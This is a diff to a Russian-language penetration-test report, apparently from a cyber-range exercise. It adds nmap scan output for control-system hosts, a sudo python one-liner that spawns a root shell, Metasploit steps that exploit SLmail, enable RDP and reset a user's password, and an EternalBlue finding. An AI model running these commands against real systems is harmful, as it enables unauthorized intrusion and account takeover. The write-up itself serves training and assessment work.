@@ -155,6 +155,33 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 1.4. АСУ ТП
 ```
+Nmap scan report for 10.33.239.5
+PORT      STATE SERVICE        VERSION
+22/tcp    open  ssh            OpenSSH for_Windows_8.6 (protocol 2.0)
+80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
+1433/tcp  open  ms-sql-s       Microsoft SQL Server 2012 11.00.7001
+3389/tcp  open  ms-wbt-server?
+49152/tcp open  msrpc          Microsoft Windows RPC
+49153/tcp open  msrpc          Microsoft Windows RPC
+49154/tcp open  msrpc          Microsoft Windows RPC
+Service Info: Host: OIK-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 10.33.239.6
+PORT      STATE SERVICE        VERSION
+22/tcp    open  ssh            OpenSSH for_Windows_8.6 (protocol 2.0)
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
+3389/tcp  open  ms-wbt-server?
+49152/tcp open  msrpc          Microsoft Windows RPC
+49153/tcp open  msrpc          Microsoft Windows RPC
+49154/tcp open  msrpc          Microsoft Windows RPC
+49175/tcp open  msrpc          Microsoft Windows RPC
+Service Info: Host: OIK-CLIENT; OS: Windows; CPE: cpe:/o:microsoft:windows
+
 Nmap scan report for 10.33.240.5
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol2.0)
@@ -202,6 +229,10 @@ Web server 10.33.2.10:80 – Word Press, на том же IP есть база �
 
 Web server 10.33.2.11:80 – Atrium (другое название - CyberPolygon)
 
+SLmail 10.33.2.12
+
+LDAP 10.33.3.10
+
 2.1. WordPress
 
 Найдена вкладка для отправки комментариев, были безуспешные попытки ввести инъекцию XSS.
@@ -217,3 +248,41 @@ define( 'DB_PASSWORD', 'mypassword' );
 Благодаря данным администратора с помощью arbitrary file upload (в Theme editor) мы пробросили reverse shell и получили remote code execution, 
 с помощью нее найдена папка *cadm*, в которой находится веб-приложение на flask (*SolarApp_back*) с простойsql-инъекцией.
 Скорее всего, именно ее использовал злоумышленник.
+
+Используя Linux Smart Enumeration (https://github.com/diego-treitos/linux-smart-enumeration), было обнаружено, что python может быть запущен с помощью sudo без ввода пароля (вероятно, это было сделано для того, чтобы запускался ранее найденный flask-сервер). С помощью команды ниже мы получили root-доступ (убедились, введя команду id): 
+```sudo python 2>&1 -c "from os import system; system('/bin/sh -i 2>&1')"```
+
+2.2. SLmail
+
+С помощью Metasploit (https://www.rapid7.com/db/modules/exploit/windows/pop3/seattlelab_pass/) получен доступ к консоли Windows пользователя, там найдены папки SLmail, SLadmin (в папке Program File (x86)).
+С помощью команды ```net user``` был обнаружен пользователь cadm. Изменив пароль у этого пользователя, мы смогли подключиться по RDP. Основные цели -  восстановить сервер Slmail и восстановить пароль на сервисе CyberPolygon. 
+
+Порядок команд для изменения пароля:
+```
+chcp 65001
+
+use post/windows/manage/enable_rdp
+
+set USERNAME aaaa
+
+set PASSWORD trew
+
+set SESSION session_id
+
+run
+
+Get-Content
+
+sessions -c "chcp 65001" -i index
+
+net user cadm pass
+```
+
+2.3. SIED 
+
+С помощью социальной инженерии удалось найти руководство по эксплуатации данной разработки (http://www.smarteps.ru/). 
+
+
+2.4. 10.33.240.14 (Eternal Blue)
+
+Использовав эксплойт мы выяснили, что на данном сервисе есть уязвимость Eternal Blue. 
